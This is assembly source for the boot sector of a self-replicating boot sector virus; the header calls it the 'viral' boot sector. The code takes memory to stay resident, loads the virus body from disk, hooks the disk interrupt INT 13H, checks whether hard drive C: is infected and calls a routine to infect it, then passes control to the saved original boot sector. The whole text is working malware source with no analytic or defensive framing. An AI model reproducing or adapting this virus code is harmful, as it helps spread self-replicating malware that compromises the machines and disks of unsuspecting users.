;*******************************************************************************
;* THIS IS THE REPLACEMENT (VIRAL) BOOT SECTOR                                 *
;*******************************************************************************

        ORG     7C00H                           ;Starting location for boot sec


BOOT_START:
        jmp     SHORT BOOT                      ;jump over data area
        db      090H                            ;an extra byte for near jump

BOOT_DATA:
BS_ID              DB      '        '      ;identifier for boot sector
BS_BYTES_PER_SEC   DW      ?               ;bytes per sector
BS_SECS_PER_CLUST  DB      ?               ;sectors per cluster
BS_RESERVED_SECS   DW      ?               ;reserved sectors at beginning of disk
BS_FATS            DB      ?               ;copies of fat on disk
BS_DIR_ENTRIES     DW      ?               ;number of entries in root directory
BS_SECTORS_ON_DISK DW      ?               ;total number of sectors on disk
BS_FORMAT_ID       DB      ?               ;disk format ID
BS_SECS_PER_FAT    DW      ?               ;number of sectors per FAT
BS_SECS_PER_TRACK  DW      ?               ;number of sectors per track (one head)
BS_HEADS           DW      ?               ;number of heads on disk
BS_DBT             DB      34 dup (?)

;The following are for the virus' use
VIRCX   dw      0                               ;cx and dx for trk/sec/hd/drv
VIRDX   dw      0                               ;of virus location

;The boot sector code starts here
BOOT:
        cli                                     ;interrupts off
        xor     ax,ax
        mov     ss,ax
        mov     ds,ax
        mov     es,ax                           ;set up segment registers
        mov     sp,OFFSET BOOT_START            ;and stack pointer
        sti

        mov     cl,6                            ;prep to convert kb's to seg
        mov     ax,[MEMSIZE]                    ;get size of memory available
        shl     ax,cl                           ;convert KBytes into a segment
        sub     ax,7E0H                         ;subtract enough so this code
        mov     es,ax                           ;will have the right offset to
        sub     [MEMSIZE],(VIR_SIZE+3)/2        ;go memory resident in high ram

GO_RELOC:
        mov     si,OFFSET BOOT_START            ;set up ds:si and es:di in order
        mov     di,si                           ;to relocate this code
        mov     cx,256                          ;to high memory
        rep     movsw                           ;and go move this sector
        push    es
        mov     ax,OFFSET RELOC
        push    ax                              ;push new far @RELOC onto stack
        retf                                    ;and go there with retf

RELOC:                                          ;now we're in high memory
        push    es                              ;so let's install the virus
        pop     ds
        mov     bx,OFFSET BBS                   ;set up buffer to read virus
        mov     cx,[VIRCX]
        mov     dx,[VIRDX]
        mov     si,VIR_SIZE+1                   ;read VIR_SIZE+1 sectors
LOAD1:  push    si
        mov     ax,0201H                        ;read VIR_SIZE+1 sectors
        int     13H                             ;call BIOS to read it
        pop     si
        jc      LOAD1                           ;try again if it fails
        add     bx,512                          ;increment read buffer
        inc     cl                              ;get ready to do next sector--inc sector count
        cmp     cl,BYTE PTR [BS_SECS_PER_TRACK] ;last sector on track?
        jbe     LOAD2                           ;no, continue
        mov     cl,1                            ;yes, set sector=1
        inc     dh                              ;try next side
        cmp     dh,BYTE PTR [BS_HEADS]          ;last side?
        jb      LOAD2                           ;no, continue
        xor     dh,dh                           ;yes, set side=0
        inc     ch                              ;and increment track count
LOAD2:  dec     si
        jnz     LOAD1

MOVE_OLD_BS:
        xor     ax,ax                           ;now move old boot sector into
        mov     es,ax                           ;low memory
        mov     si,OFFSET SCRATCHBUF            ;at 0000:7C00
        mov     di,OFFSET BOOT_START
        mov     cx,256
        rep     movsw

SET_SEGMENTS:                                   ;change segments around a bit
        cli
        mov     ax,cs
        mov     ss,ax
        mov     sp,OFFSET BBS                   ;set up the stack for the virus
        sti
        push    cs                              ;and also the es register
        pop     es

INSTALL_INT13H:                                 ;now hook the Disk BIOS int
        xor     ax,ax
        mov     ds,ax
        mov     si,13H*4                        ;save the old int 13H vector
        mov     di,OFFSET OLD_13H
        movsw
        movsw
        mov     si,0EH*4                        ;save the old int 0EH vector
        mov     di,OFFSET OLD_0EH
        movsw
        movsw
        mov     bx,13H*4                        ;set up new INT 13H vector
        mov     [bx],OFFSET INT_13H
        mov     [bx+2],es
        mov     bx,0EH*4                        ;set up new INT 0EH vector
        mov     [bx],OFFSET INT_0EH
        mov     [bx+2],es

CHECK_DRIVE:
        push    cs                              ;set ds to point here now
        pop     ds
        mov     dx,[VIRDX]
        cmp     dl,80H                          ;if booting from a hard drive,
        jz      DONE                            ;nothing else needed at boot

FLOPPY_DISK:                                    ;if loading from a floppy drive,
        call    IS_HARD_THERE                   ;see if a hard disk exists here
        jz      DONE                            ;no hard disk, all done booting
        mov     ax,201H
        mov     bx,OFFSET SCRATCHBUF
        mov     cx,1
        mov     dx,80H
        pushf
        call    DWORD PTR [OLD_13H]
        call    IS_VBS                          ;and see if C: is infected
        jz      DONE                            ;yes, all done booting
        call    INFECT_HARD                     ;else go infect hard drive C:

DONE:
        xor     ax,ax                           ;now go execute old boot sector
        push    ax                              ;at 0000:7C00
        mov     ax,OFFSET BOOT_START
        push    ax
        retf

END_BS_CODE:

        ORG     7DBEH

PART:   DB      40H dup (?)                     ;partition table goes here

        ORG     7DFEH

        DB      55H,0AAH                        ;boot sector ID goes here

ENDCODE:                                        ;label for the end of boot sec
